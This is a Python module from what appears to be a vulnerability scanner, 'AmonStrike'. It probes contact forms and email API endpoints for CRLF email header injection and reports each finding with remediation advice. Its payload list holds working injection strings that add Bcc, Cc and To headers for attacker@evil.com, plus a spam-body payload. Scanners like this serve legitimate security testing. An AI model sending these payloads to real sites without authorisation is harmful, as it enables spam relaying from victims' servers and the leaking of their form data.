"""AmonStrike — Email Header Injection Module"""
from .base import BaseModule

INJECT_PAYLOADS = [
    "test@test.com\r\nBcc: attacker@evil.com",
    "test@test.com%0ABcc: attacker@evil.com",
    "test@test.com\nCc: attacker@evil.com",
    "test@test.com\r\nTo: attacker@evil.com\r\nSubject: injected",
    "victim@target.com\r\n\r\nspam content here",
]

EMAIL_FIELDS = ["email","to","from","cc","bcc","subject","name","reply_to"]

class EmailInjectionModule(BaseModule):
    NAME        = "email_injection"
    DESCRIPTION = "Email header injection — CC/BCC injection via contact forms"

    def run(self):
        self.log("Testing email injection...")
        self._test_contact_forms()
        self._test_api_endpoints()
        return self.result()

    def _test_contact_forms(self):
        r0 = self.get("")
        if not r0: return
        for path in ["/contact","/api/contact","/support","/api/support","/api/email"]:
            r = self.get(path)
            if not r or r.status_code == 404: continue
            for payload in INJECT_PAYLOADS[:3]:
                data = {"email": payload, "name":"test", "message":"test",
                        "subject":"test"}
                r2 = self.post(path, data=data)
                if r2 and r2.status_code in [200,201]:
                    if any(w in r2.text.lower() for w in ["sent","success","thank"]):
                        self.add_finding(
                            title       = f"Email Header Injection at {path}",
                            severity    = "MEDIUM",
                            description = (
                                "Email form accepted CRLF-injected header. "
                                "Attacker can inject CC/BCC headers to send spam from your server "
                                "or exfiltrate form data to arbitrary addresses."
                            ),
                            evidence    = f"Path: {path}\nPayload: {repr(payload)}\nResponse: sent/success",
                            remediation = "Strip CR/LF from all email fields. Use parameterized email libraries.",
                            url=self.url+path, parameter="email", payload=payload, cve="CWE-93",
                        )
                        return

    def _test_api_endpoints(self):
        for path in ["/api/v1/email","/api/notify","/api/invite"]:
            r = self.get(path)
            if not r or r.status_code == 404: continue
            for payload in INJECT_PAYLOADS[:2]:
                r2 = self.post(path, json={"email": payload, "to": payload})
                if r2 and r2.status_code in [200,201]:
                    self.add_finding(
                        title       = f"Email Injection via API: {path}",
                        severity    = "MEDIUM",
                        description = "API email endpoint vulnerable to header injection.",
                        evidence    = f"Path: {path}\nPayload: {repr(payload)}",
                        remediation = "Validate email addresses. Strip CRLF. Use allowlist for recipients.",
                        url=self.url+path, parameter="email", payload=payload, cve="CWE-93",
                    )
